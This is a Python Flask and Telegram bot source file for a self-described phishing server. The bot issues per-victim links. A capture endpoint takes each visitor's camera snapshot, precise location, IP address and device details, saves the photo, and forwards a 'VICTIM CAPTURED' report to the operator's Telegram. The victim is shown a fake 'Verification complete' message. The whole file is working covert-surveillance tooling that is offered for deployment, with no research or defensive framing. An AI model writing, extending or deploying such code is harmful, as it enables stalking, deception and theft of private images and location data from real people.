import uuid
import requests
from flask import Flask, request, render_template
from datetime import datetime
import base64
import os
import threading

# --- CONFIGURATION ---
# Get these from environment variables if you set them in Render, 
# otherwise hardcode for quick testing.
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "YOUR_TELEGRAM_USER_ID")

# Render will provide a public URL like https://my-app.onrender.com
# We'll use request.host_url to dynamically build links.
app = Flask(__name__)

def get_base_url():
    """Dynamically gets the current base URL (http/https + host)."""
    return request.host_url.rstrip('/')

def send_telegram(text, chat_id=ADMIN_CHAT_ID):
    """Helper to send message to your Telegram"""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("⚠️ BOT_TOKEN not set. Skipping Telegram send.")
        print(text)
        return

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"Telegram send error: {e}")

# --- TELEGRAM BOT HANDLERS ---
# We use python-telegram-bot's polling method. 
# This runs in a background thread, so the Flask server stays alive.

def bot_listener():
    from telegram import Update
    from telegram.ext import Application, CommandHandler

    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("⚠️ BOT_TOKEN is default. Bot listener not starting.")
        return

    application = Application.builder().token(BOT_TOKEN).build()

    def start(update, context):
        user = update.effective_user
        if str(user.id) != str(ADMIN_CHAT_ID):
            return
        send_telegram(f"✅ <b>Phishing Bot Active</b>\n\nType <code>/link</code> to generate a new victim link.", user.id)

    def generate_link(update, context):
        user = update.effective_user
        if str(user.id) != str(ADMIN_CHAT_ID):
            return
        
        # Generate Unique ID
        unique_id = str(uuid.uuid4())[:8]
        
        # Get the current public URL from the Flask request context 
        # OR use a hardcoded env var if request context isn't available 
        # (it is available in handlers triggered by webhooks, 
        # but for polling, we need a fallback).
        # Since this is polling, request.host_url might not be set.
        # We'll use a global variable set on startup if available, 
        # or assume the Render URL is known via env var.
        
        # Best practice for Render: Set RENDER_URL in env vars
        base_url = os.getenv("RENDER_URL", "http://localhost:5000")
        link = f"{base_url}/phish/{unique_id}"
        
        msg = f"""🔗 <b>New Phishing Link</b>

<b>Link:</b>
{link}

<b>ID:</b> <code>{unique_id}</code>
<b>Status:</b> Waiting for victim...
<b>Server:</b> {base_url}"""
        send_telegram(msg, user.id)

    def help_command(update, context):
        send_telegram("Commands:\n/link - Generate new link\n/help - Show help", update.effective_user.id)

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("link", generate_link))
    application.add_handler(CommandHandler("help", help_command))

    print("🤖 Bot listener started (Polling Mode).")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

# Start Bot Listener in a background thread
# This ensures the bot responds even if the web server is idle
bot_thread = threading.Thread(target=bot_listener, daemon=True)
bot_thread.start()

# --- PHISHING ENDPOINTS ---

@app.route('/')
def index():
    return """
    <h1>🕸️ Phishing Bot Server</h1>
    <p>Status: <b>Active</b></p>
    <p>Bot Token: <code>Configured</code> if 'BOT_TOKEN' in os.environ else 'Default'</p>
    <p>Admin Chat ID: <code>{ADMIN_CHAT_ID}</code></p>
    <p>Public URL: <code>{request.host_url}</code></p>
    <p>Use <code>/link</code> in your bot to generate a phishing link.</p>
    """.format(request.host_url)

@app.route('/phish/<unique_id>')
def phish_page(unique_id):
    """
    Serves the phishing page to the victim.
    """
    print(f"👀 Victim visited page. ID: {unique_id} | IP: {request.remote_addr}")
    return render_template('phish.html', unique_id=unique_id)

@app.route('/capture', methods=['POST'])
def capture_data():
    """
    Receives data from the victim's browser.
    """
    data = request.json
    unique_id = data.get('unique_id', 'unknown')
    victim_ip = request.remote_addr # Server-side IP (fallback)
    
    # 1. Save Camera Snapshot
    snapshot_path = None
    if data.get('cameraSnapshot'):
        base64_data = data['cameraSnapshot'].split(',')[1]
        filename = f"captures/{unique_id}_{datetime.now().strftime('%H%M%S')}.jpg"
        os.makedirs("captures", exist_ok=True)
        try:
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(base64_data))
            snapshot_path = filename
        except Exception as e:
            print(f"Error saving snapshot: {e}")

    # 2. Format the Report
    report = f"""
🚨 <b>VICTIM CAPTURED</b> 🚨
🆔 <b>ID:</b> <code>{unique_id}</code>

📍 <b>LOCATION</b>
🏙️ City: {data.get('city', 'N/A')}
🗺️ Region: {data.get('region', 'N/A')}
🌍 Country: {data.get('country', 'N/A')}
📌 Coords: {data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}

🌐 <b>NETWORK</b>
🔢 Client IP: {data.get('ip', 'N/A')}
🔢 Server IP: {victim_ip}
💻 UA: {str(data.get('userAgent', 'N/A'))[:60]}...
🖥️ Screen: {data.get('screenRes', 'N/A')}

📸 <b>CAMERA</b>
{'✅ Snapshot saved to: ' + snapshot_path if snapshot_path else '❌ No camera data'}

🕒 <b>TIME</b>
{datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
"""
    
    # 3. Send to Admin Telegram
    send_telegram(report)
    
    # 4. Return success to victim
    return {"status": "success", "msg": "Verification complete."}

@app.route('/health')
def health():
    return "OK"

if __name__ == '__main__':
    # Render runs on port 0.0.0.0:5000 by default
    # The port is injected via PORT env var
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)